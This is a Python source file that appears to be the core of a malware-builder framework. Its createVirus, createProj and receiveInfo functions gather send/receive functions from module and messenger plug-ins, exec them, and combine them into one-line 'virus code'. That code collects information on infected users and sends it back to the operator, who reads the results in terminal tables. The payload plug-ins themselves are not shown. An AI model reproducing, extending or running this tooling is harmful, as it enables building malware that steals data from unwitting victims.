# -*- coding:utf-8 -*-

# Importing libs
import re, os, sys, ast, random, base64, time, json, hashlib, platform
import astunparse
from lib.ol.main import onelinerize
from lib.logger import log
import lib
# Importing terminaltables
try:
    import terminaltables
except:
    print("Oops")

# Constants
ignoreFiles = [".DS_Store", "__init__.py", "config.py"]
ignoreEnds = ["pyc", "uninit"]
supportedOS = ["Windows", "Darwin", "Linux"]

# The location of the database
dataLoc = "db/data.json"

# The identification of the strings that needs update
idf = "!@knicky.%s@!"


############################
#        Config Base       #
############################
class updateBase():
    def __init__(self):
        self.stop = True

    def getU(self):
        return self.updateList

    def main(self):
        if self.stop or self.bypass:
            try:
                temp = open(self.fileName).read()
                if not self.bypass:
                    if utils.getSHA1(temp) == lib.sha1Info.sg:
                        utils.updateFile(self.fileName,
                                         self.updateList)
                        return "Success"
                    else:
                        return ("[!] Error! Template file (%s) is not correct"
                                % utils.getSHA1(temp))
                utils.updateFile(self.fileName,
                                 self.updateList)
                return "Success"
            except:
                return "[!] Error! No template file found"
        else:
            return "[!] Please fix errors first"

    def stop(self):
        self.stop = False


############################
#      Utils Functions     #
############################
class utils():
    @staticmethod
    def base64Encode(strx):
        """
            Convert the string to a base64 string
            
            :arguments
            ----------
            String
                strx: the string needs to be converted
            
            :return
            -------
            String
                the string encoded
        """
        return base64.b64encode(strx.encode("utf-8"))

    @staticmethod
    def convertSupportedOS(supportedOS):
        """
            Convert the supportedOS string to a list
            
            :arguments
            ----------
            String
                supportedOS: A string of supportedOS
            
            :return
            -------
            List
                A list of supportedOS
            
            :example
            --------
                >>> convertSupportedOS("['Darwin']")
                ['Darwin']
        """
        supportedOS = supportedOS.replace(" ", "") \
            .replace('"', '')
        return supportedOS.split(",")

    @classmethod
    def checkFile(cls, fileLines,
                  path="", sender=False):
        """
            Check the file and convert it into a dict of important information
            
            :arguments
            ----------
            String
                fileLines: The conten of the file
            Bool
                sender: Checking the messenger file or module file
            
            :return
            -------
            Dict
                A dict of important information (see example)
            
            :example
            --------
                >>> checkFile(<user.py>)
                {
                    "success": 0,
                    "info": "None",
                    "sys": ["Windows", "Darwin", "Linux"],
                    "name": "userInfo",
                    "desc": "Get User Info",
                    "sendCode": <codes using a randomly generated function name>,
                    "sendCodeFunc": <randomly generated function name>,
                    "receiveCode": "",
                    "receiveCodeFunc": ""
                }
        """
        _regex = "__%s__.*?=.*?(\'|\")(.*?)(\'|\")"
        _sys = re.compile("__%s__.*?=.*?\[(.*?)\]" % "sys")
        _name = re.compile(_regex % "name")
        _desc = re.compile(_regex % "desc")
        resultTemp = {
            "success": 0,
            "info": "None",
            "sys": "",
            "name": "",
            "desc": "",
            "sendCode": "",
            "sendCodeFunc": "",
            "receiveCode": "",
            "receiveCodeFunc": ""
        }
        for i in enumerate(fileLines):
            if ";" not in i[1]:
                if not resultTemp["sys"]:
                    lineSys = _sys.findall(i[1])
                    if lineSys:
                        resultTemp["sys"] = cls.convertSupportedOS(lineSys[0])
                        continue
                if not resultTemp["name"]:
                    lineName = _name.findall(i[1])
                    if lineName:
                        resultTemp["name"] = lineName[0][1]
                        continue
                if not resultTemp["desc"]:
                    path = path.replace("module", "") \
                        .replace("messenger", "").replace("/", "")
                    if len(path) > 0:
                        path = "[%s] " % path
                    lineDesc = _desc.findall(i[1])
                    if lineDesc:
                        resultTemp["desc"] = path + lineDesc[0][1]
                        continue
            else:
                trivialResult = cls.checkFile(i[1].split(";"))
                for j in trivialResult:
                    if not resultTemp[j] and trivialResult[j]:
                        resultTemp[j] = trivialResult[j]
        return resultTemp

    @staticmethod
    def checkContent(info, file):
        """
            Check the output of checkFile
            
            :arguments
            ----------
            Dict
                info: The output of checkFile
            String
                file: file path
            
            :return
            -------
            List
                The modified output of checkFile
        """
        for i in info["sys"]:
            if i not in supportedOS:
                info["success"] = 1
                info["info"] = "OS not Supported"
                print("[!] OS %s not Supported for file %s" % (i, file))
        for k in info:
            if not info[k] and k in ["sys", "name", "desc"]:
                info["success"] = 2
                info["info"] = k
                print("[!] No %s has been given in file %s" % (info["info"],
                                                               file))
        if " " in info["name"]:
            info["success"] = 3
            info["info"] = "Space In Name"
            print("[!] There should be no space in name of %s" % file)
        return info

    @staticmethod
    def checkModuleInt(info, file):
        """
            Check the abstract syntax tree
            
            :arguments
            ----------
            Dict
                info: The output of checkFile
            String
                file: file path
            
            :return
            -------
            List
                The modified output of checkFile
        """
        try:
            code = open(file).read()
            for i in ast.walk(ast.parse(code)):
                try:
                    if isinstance(i, ast.FunctionDef):
                        funcCode = astunparse.unparse(i)
                        reSendFunc = re.compile("def.+?send\(")
                        if reSendFunc.findall(funcCode):
                            funcName = 'send%s%s' % (
                                info["name"], str(random.randint(0, 2000)))
                            sendCode = onelinerize(reSendFunc.sub('def %s(' % funcName,
                                                                  funcCode))
                            exec(sendCode)
                            info["sendCode"] = sendCode
                            info["sendCodeFunc"] = funcName
                except:
                    info["success"] = 4
                    info["info"] = "Error"
                    print("[x] Error %s in file %s" % (sys.exc_info()[0], file))
            if info["sendCode"] == "":
                info["success"] = 5
                info["info"] = "No Send Func"
                print("[!] No 'send' function in file %s" % file)
        except:
            info["success"] = 4
            info["info"] = "Error"
            print("[x] Error %s in file %s" % (sys.exc_info()[0], file))
        return info

    @classmethod
    def checkModule(cls, info, file):
        """
            Check the module
            
            :arguments
            ----------
            Dict
                info: The output of checkFile
            String
                file: file path
            
            :return
            -------
            List
                The output of checkContent
        """
        return cls.checkContent(
            cls.checkModuleInt(info, file),
            file)

    @staticmethod
    def checkSendInt(info, file):
        """
            Check the messenger's abstract syntax tree
            
            :arguments
            ----------
            Dict
                info: The output of checkFile
            String
                file: file path
            
            :return
            -------
            List
                The modified output of checkFile
        """
        try:
            code = open(file).read()
            for i in ast.walk(ast.parse(code)):
                try:
                    if isinstance(i, ast.FunctionDef):
                        funcCode = astunparse.unparse(i)
                        reSendFunc = re.compile("def.+?send\(")
                        reReceiveFunc = re.compile("def.+?receive\(")
                        if reSendFunc.findall(funcCode):
                            funcName = 'send%s%s' % (
                                info["name"], str(random.randint(0, 2000)))
                            sendCode = onelinerize(reSendFunc.sub('def %s(' % funcName,
                                                                  funcCode))
                            exec(sendCode)
                            info["sendCode"] = sendCode
                            info["sendCodeFunc"] = funcName
                        elif reReceiveFunc.findall(funcCode):
                            funcName = 'receive%s%s' % (
                                info["name"], str(random.randint(0, 2000)))
                            receiveCode = reReceiveFunc.sub('def %s(' % funcName,
                                                            funcCode)
                            exec(receiveCode)
                            info["receiveCode"] = receiveCode
                            info["receiveCodeFunc"] = funcName
                except:
                    info["success"] = 4
                    info["info"] = "Error"
                    print("[x] Error %s in file %s" % (sys.exc_info()[0], file))
            if info["sendCode"] == "":
                info["success"] = 5
                info["info"] = "No Send Func"
                print("[!] No 'send' function in file %s" % file)
            if info["receiveCode"] == "":
                info["success"] = 5
                info["info"] = "No Receive Func"
                print("[!] No 'receive' function in file %s" % file)
        except:
            info["success"] = 4
            info["info"] = "Error"
            print("[x] Error %s in file %s" % (sys.exc_info()[0], file))
        return info

    @classmethod
    def checkSend(cls, info, file):
        """
            Check the messenger
            
            :arguments
            ----------
            Dict
                info: The output of checkFile
            String
                file: file path
            
            :return
            -------
            List
                The output of checkContent
        """
        return cls.checkContent(
            cls.checkSendInt(info, file),
            file)

    @staticmethod
    def checkAva(module, info, platform):
        """
            Check the availability of the module/messenger
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        moduleNames = [x["name"] for x in info]
        if module in moduleNames:
            for i in info:
                if i["name"] == module:
                    if i["success"] == 0:
                        if platform in i["sys"]:
                            return True
                        else:
                            print("[!] Module %s is not supporting %s, ignored" % (
                                module, platform)
                                  )
                            return False
                    else:
                        print("[!] Module %s is not available, ignored" % module)
                        return False
        print("[!] Module %s is not available, ignored" % module)
        return False

    @staticmethod
    def visitJSON():
        """
            Visit the database
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        try:
            data = json.loads(open(dataLoc).read())
            return data
        except Exception as e:
            print("[x] Error in %s" % dataLoc)
            raise e

    @staticmethod
    def getSHA1(content):
        """
            Get SHA1 of the content
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        return str(hashlib.sha1(content).hexdigest())

    @staticmethod
    def updateFile(fileName, updateList):
        """
            Update uninited modules/messengers
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        try:
            file = open(fileName, 'r')
            newFile = open(fileName.replace("uninit", "py"),
                           "w")
            for line in file:
                for updates in updateList:
                    if idf % updates["original"] in line:
                        line = line.replace(idf % updates["original"],
                                            updates["after"])
                newFile.write(line)
            file.close()
            newFile.close()
        except:
            return "[!] Error in updating"


############################
#         Core API         #
############################
class API():
    @staticmethod
    def getModuleInfo(path='module',
                      _os=['Darwin', 'Windows', 'Linux']):
        """
            Get all information of all modules
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        moduleInfo = []
        for dirpath, dirnames, filenames in os.walk(path):
            for file in filenames:
                fullpath = os.path.join(dirpath, file)
                if not (file in ignoreFiles\
                        or file.split(".")[-1] in ignoreEnds):
                    result = utils.checkModule(
                        utils.checkFile(
                            open(fullpath).readlines(), dirpath
                        ), fullpath)
                    isOSWanted = False
                    for o in _os:
                        if o in result['sys']:
                            isOSWanted = True
                    if isOSWanted:
                        moduleInfo.append(result)
        return moduleInfo

    @staticmethod
    def getSendInfo(path='messenger',
                    _os=['Darwin', 'Windows', 'Linux']):
        """
            Get all information of all messengers
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        sendInfo = []
        for dirpath, dirnames, filenames in os.walk(path):
            for file in filenames:
                fullpath = os.path.join(dirpath, file)
                if not (file in ignoreFiles \
                        or file.split(".")[-1] in ignoreEnds):
                    result = utils.checkSend(
                        utils.checkFile(
                            open(fullpath).readlines(), dirpath
                        ), fullpath
                    )
                    isOSWanted = False
                    for o in _os:
                        if o in result['sys']:
                            isOSWanted = True
                    if isOSWanted:
                        sendInfo.append(result)
        return sendInfo

    @classmethod
    def createVirus(cls, moduleList, sendList,
                    projName, platform=platform.system(),
                    sendPath='messenger',
                    modulePath="module"):
        """
            Generate the virus code
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        moduleInfo = cls.getModuleInfo(modulePath)
        sendInfo = cls.getSendInfo(sendPath)
        realModuleList = []
        realSendList = []
        for send in enumerate(sendList):
            if utils.checkAva(send[1], sendInfo, platform):
                for i in sendInfo:
                    if i["name"] == send[1]:
                        realSendList.append(i)
        for module in enumerate(moduleList):
            if utils.checkAva(module[1], moduleInfo, platform):
                for i in moduleInfo:
                    if i["name"] == module[1]:
                        realModuleList.append(i)
        moduleCode = ""
        sendCode = ""
        execCode = ""
        for realModule in realModuleList:
            moduleCode += "%s;" % (realModule["sendCode"])
        for realSend in realSendList:
            sendCode += "%s;" % (realSend["sendCode"])
        for i in realModuleList:
            for j in realSendList:
                execCode += "%s(str(%s()), '%s', '%s');" % (
                    j["sendCodeFunc"], i["sendCodeFunc"],
                    i["name"], projName)
        return moduleCode + sendCode + execCode

    @classmethod
    def createReceive(cls, sendList,
                      projName, platform=platform.system(),
                      sendPath='messenger'):
        """
            Generate the receiving code
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        sendInfo = cls.getSendInfo(sendPath)
        realSendList = []
        for send in enumerate(sendList):
            if utils.checkAva(send[1], sendInfo, platform):
                for i in sendInfo:
                    if i["name"] == send[1]:
                        realSendList.append(i)
        receiveCode = ""
        execCode = ""
        for realSend in realSendList:
            receiveCode += "%s\n" % (realSend["receiveCode"])

        for j in realSendList:
            execCode += "receiveObj = %s(@knicky.RANGE, '%s');" % (
                j["receiveCodeFunc"], projName
            )
        return receiveCode + execCode

    @classmethod
    def createProj(cls,
                   moduleList, sendList, platform=platform.system(),
                   projName=str(utils.base64Encode(str(time.time() +
                                                       random.randint(0, 20000)))).replace("=", ""),
                   sendPath='messenger',
                   modulePath="module"):
        """
            Create a virus project
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        print("[*] The project name is %s" % projName)
        data = utils.visitJSON()
        projects = data["projects"]
        virusCode = cls.createVirus(moduleList, sendList, projName, platform,
                                    sendPath, modulePath)
        receiveCode = cls.createReceive(sendList, projName, platform, sendPath)
        projects.append({
            "projName": projName,
            "virusCode": utils.base64Encode(virusCode),
            "receiveCode": utils.base64Encode(receiveCode),
            "time": time.time()
        })
        data["projects"] = projects
        with open(dataLoc, "w") as file:
            json.dump(data, file)
        print("[*] Success!!")
        return virusCode

    @staticmethod
    def listProj():
        """
            List all projects
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        data = utils.visitJSON()
        result = []
        for i in data["projects"]:
            result.append({
                "name": i["projName"],
                "time": i["time"]
            })
        return result

    @staticmethod
    def getReceiveCode(projName):
        """
            Get receiving code from database
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        data = utils.visitJSON()
        receiveCode = ""
        for i in data["projects"]:
            if i["projName"] == projName:
                receiveCode = base64.b64decode(i["receiveCode"])
        return receiveCode

    @staticmethod
    def getVirusCode(projName):
        """
            Get virus code from database
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        data = utils.visitJSON()
        virusCode = ""
        for i in data["projects"]:
            if i["projName"] == projName:
                virusCode = base64.b64decode(i["virusCode"])
        return virusCode

    @classmethod
    def receiveInfo(cls, projName, _range=10):
        """
            Receive the response of the virus
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        data = utils.visitJSON()
        receiveCode = cls.getReceiveCode(projName)
        if receiveCode == "":
            print("[x] Your entered wrong project name")
            return []
        else:
            exec(receiveCode \
                 .replace("@knicky.RANGE", str(_range)))
            return receiveObj


############################
#       CLI Functions      #
############################
class beautify():
    # Utils part
    @classmethod
    def getTime(cls, timestamp):
        """
            Convert timestamp to local time
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        return time.strftime("%Y-%m-%d %H:%M:%S",
                             time.localtime(float(timestamp)))

    @classmethod
    def tm(cls, result):
        """
            Output a table in terminal
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        try:
            return terminaltables.AsciiTable(result).table
        except Exception as e:
            print("Error in terminaltables %s" % e)

    @classmethod
    def bM(cls, info):
        """
            Convert modules/messenger information to terminaltable type
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        result = [["Name", "Description", "SupportedOS", "Status"]]
        for i in info:
            if i["success"] == 0:
                if i["desc"][0] == "[" and "]" in i["desc"]:
                    desc = i["desc"].replace("[", "%s[" % log.WARNING_COLOR) \
                        .replace("]", "]%s" % log.END_COLOR)
                else:
                    desc = i["desc"]
                result.append([i["name"], desc, i["sys"], "OK"])
            else:
                result.append(
                    [i["name"], i["desc"], i["sys"], "Failed"]
                )
        return cls.tm(result)

    @classmethod
    def bC(cls, info):
        """
            Convert project information to terminaltable type
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        result = [["Name", "Time"]]
        for i in info:
            result.append([i["name"], cls.getTime(i["time"])])
        return cls.tm(result)

    @classmethod
    def bR(cls, info):
        """
            Convert receive information to terminaltable type
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        result = [["Module", "From User", "Date", "Content"]]
        for i in info:
            result.append([i["_byModule"], i["_from"],
                           cls.getTime(i["_date"]),
                           i["_content"]])
        return cls.tm(result)

    @classmethod
    def bS(cls, info):
        """
            Convert update information to terminaltable type
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        result = [["Argument", "Description"]]
        for i in info:
            result.append([i["original"], i["desc"]])
        return cls.tm(result)

    # Main part
    @classmethod
    def showInfo(cls, updateList):
        """
            Show information of update
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        return cls.bS(updateList)

    @classmethod
    def getModuleInfo(cls, path='module',
                      _os=['Darwin', 'Linux', 'Windows']):
        """
            Show information of modules
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        info = API.getModuleInfo(path=path, _os=_os)
        return cls.bM(info)

    @classmethod
    def getSendInfo(cls, path='messenger',
                    _os=['Darwin', 'Linux', 'Windows']):
        """
            Show information of messengers
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        info = API.getSendInfo(path=path, _os=_os)
        return cls.bM(info)

    @classmethod
    def listProj(cls):
        """
            List all projects in database
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        info = API.listProj()
        return cls.bC(info)

    @classmethod
    def receiveInfo(cls, projName, _range=10):
        """
            Receive information from virus
            
            :arguments
            ----------
            
            :return
            -------
            
        """
        info = API.receiveInfo(projName, _range)
        return cls.bR(info)
